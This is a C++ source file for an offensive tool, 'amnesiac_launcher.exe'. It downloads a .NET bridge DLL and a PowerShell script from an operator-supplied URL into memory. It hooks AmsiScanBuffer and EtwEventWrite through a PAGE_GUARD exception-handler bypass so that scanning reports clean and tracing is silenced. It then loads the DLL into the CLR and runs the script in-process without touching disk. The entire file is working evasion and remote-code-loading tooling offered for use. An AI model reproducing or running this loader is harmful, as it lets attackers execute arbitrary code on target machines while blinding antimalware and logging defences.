// amnesiac_launcher.exe — PAGE_GUARD AMSI+ETW bypass + in-process PS Runspace loader
//
// Usage: amnesiac_launcher.exe <operator-base-url>
// Example: amnesiac_launcher.exe http://192.168.1.100:8080
//
// Downloads AmnesiacBridge.dll and Amnesiac_ShellReady.ps1 from operator HTTP server.
// Installs PAGE_GUARD VEH bypass before CLR touches any script content.
// Runs Amnesiac interactively in-process via PS Runspace — zero disk writes on target.

#include <Windows.h>
#include <winhttp.h>
#include <evntprov.h>
#include <metahost.h>
#include <cstdio>
#include <cstring>
#include "bypass.hpp"

#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

#import "mscorlib.tlb" raw_interfaces_only \
    high_property_prefixes("_get","_put","_putref") \
    rename("ReportEvent","InteropReportEvent")

using FnAmsiScanBuffer = HRESULT(WINAPI*)(PVOID, PVOID, ULONG, LPCWSTR, PVOID, ULONG*);
using FnEtwEventWrite  = ULONG(NTAPI*)(UINT64, PVOID, ULONG, PVOID);

static constexpr ULONG kAmsiClean = 0;

// ---------------------------------------------------------------------------
// WinHTTP — download a URL entirely into a heap buffer (no disk write)
// ---------------------------------------------------------------------------
static bool HttpDownload(const wchar_t* url, BYTE** ppBuf, DWORD* pLen)
{
    URL_COMPONENTS uc   = {};
    uc.dwStructSize     = sizeof(uc);
    wchar_t host[256]   = {};
    wchar_t path[1024]  = {};
    uc.lpszHostName     = host;  uc.dwHostNameLength  = _countof(host);
    uc.lpszUrlPath      = path;  uc.dwUrlPathLength   = _countof(path);

    if (!WinHttpCrackUrl(url, 0, 0, &uc))
    {
        printf("[-] WinHttpCrackUrl failed: %lu\n", GetLastError());
        return false;
    }

    HINTERNET hSes = WinHttpOpen(L"Mozilla/5.0",
                                  WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                  WINHTTP_NO_PROXY_NAME,
                                  WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSes) { printf("[-] WinHttpOpen failed\n"); return false; }

    HINTERNET hCon = WinHttpConnect(hSes, host, uc.nPort, 0);
    if (!hCon) { WinHttpCloseHandle(hSes); printf("[-] WinHttpConnect failed\n"); return false; }

    DWORD reqFlags = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hCon, L"GET", path, nullptr,
                                         WINHTTP_NO_REFERER,
                                         WINHTTP_DEFAULT_ACCEPT_TYPES, reqFlags);
    if (!hReq) { WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes); return false; }

    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hReq, nullptr))
    {
        printf("[-] HTTP request failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes);
        return false;
    }

    // Check HTTP status
    DWORD status = 0, statusLen = sizeof(status);
    WinHttpQueryHeaders(hReq,
                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &statusLen,
                        WINHTTP_NO_HEADER_INDEX);
    if (status != 200)
    {
        printf("[-] HTTP %lu for %ls\n", status, url);
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes);
        return false;
    }

    BYTE* buf   = (BYTE*)HeapAlloc(GetProcessHeap(), 0, 1);
    DWORD total = 0;
    DWORD avail = 0;

    while (WinHttpQueryDataAvailable(hReq, &avail) && avail > 0)
    {
        BYTE* nb = (BYTE*)HeapReAlloc(GetProcessHeap(), 0, buf, total + avail + 1);
        if (!nb) break;
        buf = nb;
        DWORD read = 0;
        WinHttpReadData(hReq, buf + total, avail, &read);
        total += read;
    }
    buf[total] = 0;

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hCon);
    WinHttpCloseHandle(hSes);

    if (total == 0) { HeapFree(GetProcessHeap(), 0, buf); return false; }
    *ppBuf = buf;
    *pLen  = total;
    return true;
}

// ---------------------------------------------------------------------------
// Build a URL: baseUrl + "/" + filename  (strips trailing slash from base)
// ---------------------------------------------------------------------------
static bool BuildUrl(const wchar_t* base, const wchar_t* file,
                     wchar_t* out, int outCch)
{
    int blen = (int)wcslen(base);
    if (blen == 0 || blen >= outCch - 2) return false;
    wcsncpy_s(out, outCch, base, blen);
    if (out[blen - 1] == L'/') out[--blen] = L'\0';
    wcscat_s(out, outCch, L"/");
    wcscat_s(out, outCch, file);
    return true;
}

// ---------------------------------------------------------------------------
// CLR init — enumerate runtimes, pick the latest, start it
// ---------------------------------------------------------------------------
struct ClrCtx
{
    ICLRMetaHost*         pMeta;
    ICLRRuntimeInfo*      pInfo;
    ICorRuntimeHost*      pHost;
    mscorlib::_AppDomain* pDomain;
};

static HRESULT ClrStart(ClrCtx& c)
{
    ZeroMemory(&c, sizeof(c));
    HRESULT hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost,
                                    (LPVOID*)&c.pMeta);
    if (FAILED(hr)) return hr;

    IEnumUnknown* pEnum = nullptr;
    c.pMeta->EnumerateInstalledRuntimes(&pEnum);
    IUnknown* pUnk = nullptr;
    while (pEnum->Next(1, &pUnk, nullptr) == S_OK)
    {
        if (c.pInfo) c.pInfo->Release();
        pUnk->QueryInterface(IID_PPV_ARGS(&c.pInfo));
        pUnk->Release();
    }
    pEnum->Release();
    if (!c.pInfo) return E_FAIL;

    hr = c.pInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost,
                                (LPVOID*)&c.pHost);
    if (FAILED(hr)) return hr;

    hr = c.pHost->Start();
    if (FAILED(hr) && hr != S_FALSE) return hr;

    IUnknown* pDomUnk = nullptr;
    hr = c.pHost->GetDefaultDomain(&pDomUnk);
    if (FAILED(hr)) return hr;

    hr = pDomUnk->QueryInterface(__uuidof(mscorlib::_AppDomain),
                                  (LPVOID*)&c.pDomain);
    pDomUnk->Release();
    return hr;
}

static void ClrFree(ClrCtx& c)
{
    if (c.pDomain) c.pDomain->Release();
    if (c.pHost)   c.pHost->Release();
    if (c.pInfo)   c.pInfo->Release();
    if (c.pMeta)   c.pMeta->Release();
    ZeroMemory(&c, sizeof(c));
}

// ---------------------------------------------------------------------------
// Load DLL bytes into AppDomain, get AmnesiacBridge.Launcher.Run MethodInfo
// ---------------------------------------------------------------------------
static HRESULT LoadBridge(const ClrCtx& c, BYTE* dllBytes, DWORD dllLen,
                           mscorlib::_MethodInfo** ppRun)
{
    SAFEARRAYBOUND sab = { dllLen, 0 };
    SAFEARRAY* pSA = SafeArrayCreate(VT_UI1, 1, &sab);
    if (!pSA) return E_OUTOFMEMORY;
    void* data = nullptr;
    SafeArrayAccessData(pSA, &data);
    memcpy(data, dllBytes, dllLen);
    SafeArrayUnaccessData(pSA);

    mscorlib::_Assembly* pAsm = nullptr;
    HRESULT hr = c.pDomain->Load_3(pSA, &pAsm);
    SafeArrayDestroy(pSA);
    if (FAILED(hr) || !pAsm) return FAILED(hr) ? hr : E_FAIL;

    // GetType("AmnesiacBridge.Launcher")
    BSTR bType = SysAllocString(L"AmnesiacBridge.Launcher");
    mscorlib::_Type* pType = nullptr;
    hr = pAsm->GetType_2(bType, &pType);
    SysFreeString(bType);
    pAsm->Release();
    if (FAILED(hr) || !pType) return FAILED(hr) ? hr : E_FAIL;

    // GetMethod("Run", Public|Static = 0x10|0x08)
    BSTR bMethod = SysAllocString(L"Run");
    hr = pType->GetMethod_2(bMethod,
        (mscorlib::BindingFlags)(mscorlib::BindingFlags_Public |
                                  mscorlib::BindingFlags_Static),
        ppRun);
    SysFreeString(bMethod);
    pType->Release();
    return (FAILED(hr) || !*ppRun) ? (FAILED(hr) ? hr : E_FAIL) : S_OK;
}

// ---------------------------------------------------------------------------
// Invoke Launcher.Run(scriptContent)
// ---------------------------------------------------------------------------
static HRESULT InvokeBridge(mscorlib::_MethodInfo* pRun,
                              const char* scriptUtf8, DWORD scriptLen)
{
    // Convert UTF-8 bytes to wide string for BSTR
    int wLen = MultiByteToWideChar(CP_UTF8, 0, scriptUtf8, (int)scriptLen, nullptr, 0);
    wchar_t* wScript = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, (wLen + 1) * sizeof(wchar_t));
    if (!wScript) return E_OUTOFMEMORY;
    MultiByteToWideChar(CP_UTF8, 0, scriptUtf8, (int)scriptLen, wScript, wLen);
    wScript[wLen] = L'\0';

    VARIANT vtNull = {}, vtRet = {}, vtArg = {};
    vtNull.vt = VT_NULL;
    vtArg.vt  = VT_BSTR;
    vtArg.bstrVal = SysAllocString(wScript);
    HeapFree(GetProcessHeap(), 0, wScript);

    SAFEARRAYBOUND sab = { 1, 0 };
    SAFEARRAY* pParams = SafeArrayCreate(VT_VARIANT, 1, &sab);
    LONG idx = 0;
    SafeArrayPutElement(pParams, &idx, &vtArg);
    SysFreeString(vtArg.bstrVal);

    HRESULT hr = pRun->Invoke_3(vtNull, pParams, &vtRet);
    SafeArrayDestroy(pParams);
    VariantClear(&vtRet);
    return hr;
}

// ---------------------------------------------------------------------------
// wmain
// ---------------------------------------------------------------------------
int wmain(int argc, wchar_t* argv[])
{
    printf("[*] Amnesiac Launcher — AMSI+ETW bypass + in-process PS Runspace\n\n");

    if (argc < 2)
    {
        printf("Usage: amnesiac_launcher.exe <operator-base-url>\n");
        printf("  e.g.: amnesiac_launcher.exe http://192.168.1.100:8080\n");
        return 1;
    }

    // Resolve AMSI + ETW function pointers before CLR starts
    HMODULE hAmsi  = LoadLibraryW(L"amsi.dll");
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hAmsi || !hNtdll) { printf("[-] LoadLibrary failed\n"); return 1; }

    auto fnScan = (FnAmsiScanBuffer)GetProcAddress(hAmsi, "AmsiScanBuffer");
    auto fnEtw  = (FnEtwEventWrite) GetProcAddress(hNtdll, "EtwEventWrite");
    if (!fnScan || !fnEtw) { printf("[-] GetProcAddress failed\n"); return 1; }

    // -------------------------------------------------------------------
    // 1. Build download URLs
    // -------------------------------------------------------------------
    wchar_t bridgeUrl[1024] = {}, scriptUrl[1024] = {};
    if (!BuildUrl(argv[1], L"AmnesiacBridge.dll",       bridgeUrl, _countof(bridgeUrl)) ||
        !BuildUrl(argv[1], L"Amnesiac_ShellReady.ps1",  scriptUrl, _countof(scriptUrl)))
    {
        printf("[-] Invalid base URL\n"); return 1;
    }

    // -------------------------------------------------------------------
    // 2. Download AmnesiacBridge.dll into memory
    // -------------------------------------------------------------------
    BYTE* bridgeBytes = nullptr; DWORD bridgeLen = 0;
    printf("[*] Downloading AmnesiacBridge.dll...\n");
    if (!HttpDownload(bridgeUrl, &bridgeBytes, &bridgeLen))
    {
        printf("[-] Bridge download failed\n"); return 1;
    }
    printf("[+] Bridge: %lu bytes\n", bridgeLen);

    // -------------------------------------------------------------------
    // 3. Download Amnesiac_ShellReady.ps1 into memory
    // -------------------------------------------------------------------
    BYTE* scriptBytes = nullptr; DWORD scriptLen = 0;
    printf("[*] Downloading Amnesiac_ShellReady.ps1...\n");
    if (!HttpDownload(scriptUrl, &scriptBytes, &scriptLen))
    {
        HeapFree(GetProcessHeap(), 0, bridgeBytes);
        printf("[-] Script download failed\n"); return 1;
    }
    printf("[+] Script: %lu bytes\n", scriptLen);

    // -------------------------------------------------------------------
    // 4. Install AMSI + ETW bypass BEFORE CLR/Runspace touches any script
    // -------------------------------------------------------------------
    AddBypassTarget((PVOID)fnScan, S_OK, 6, kAmsiClean);
    AddBypassTarget((PVOID)fnEtw,  ERROR_SUCCESS);
    if (!InstallBypass())
    {
        printf("[-] Bypass installation failed\n");
        SecureZeroMemory(scriptBytes, scriptLen);
        HeapFree(GetProcessHeap(), 0, scriptBytes);
        HeapFree(GetProcessHeap(), 0, bridgeBytes);
        return 1;
    }
    printf("[+] AMSI + ETW bypass active\n");

    // -------------------------------------------------------------------
    // 5. Start CLR
    // -------------------------------------------------------------------
    ClrCtx clr = {};
    HRESULT hr = ClrStart(clr);
    if (FAILED(hr))
    {
        printf("[-] CLR init failed: 0x%08X\n", hr);
        UninstallBypass();
        SecureZeroMemory(scriptBytes, scriptLen);
        HeapFree(GetProcessHeap(), 0, scriptBytes);
        HeapFree(GetProcessHeap(), 0, bridgeBytes);
        return 1;
    }
    printf("[+] CLR ready\n");

    // -------------------------------------------------------------------
    // 6. Load AmnesiacBridge.dll into AppDomain, get Launcher.Run
    // -------------------------------------------------------------------
    mscorlib::_MethodInfo* pRun = nullptr;
    hr = LoadBridge(clr, bridgeBytes, bridgeLen, &pRun);
    HeapFree(GetProcessHeap(), 0, bridgeBytes);
    if (FAILED(hr) || !pRun)
    {
        printf("[-] Bridge load failed: 0x%08X\n", hr);
        ClrFree(clr);
        UninstallBypass();
        SecureZeroMemory(scriptBytes, scriptLen);
        HeapFree(GetProcessHeap(), 0, scriptBytes);
        return 1;
    }
    printf("[+] Bridge loaded — invoking Amnesiac...\n\n");

    // -------------------------------------------------------------------
    // 7. Invoke Launcher.Run(scriptContent) — interactive until Amnesiac exits
    // -------------------------------------------------------------------
    hr = InvokeBridge(pRun, (const char*)scriptBytes, scriptLen);

    SecureZeroMemory(scriptBytes, scriptLen);
    HeapFree(GetProcessHeap(), 0, scriptBytes);
    pRun->Release();
    ClrFree(clr);
    UninstallBypass();

    return FAILED(hr) ? 1 : 0;
}
